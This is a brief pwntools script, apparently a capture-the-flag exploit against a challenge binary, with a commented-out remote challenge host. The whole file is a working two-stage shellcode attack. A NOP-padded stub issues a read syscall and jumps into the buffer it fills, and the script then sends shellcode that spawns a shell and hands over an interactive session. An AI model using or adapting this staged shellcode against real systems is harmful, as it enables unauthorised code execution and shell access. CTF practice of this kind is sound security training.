from pwn import *

# p = remote("0.cloud.chals.io", 20922)
p = process("./foo")
stage1 = asm(
"""
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    mov al, 0x3
    add ecx, 0x10
    mov dl, 0x7f
    int 0x80
    jmp ecx
""")

p.send(stage1)
p.send(asm(shellcraft.sh()))
p.interactive()
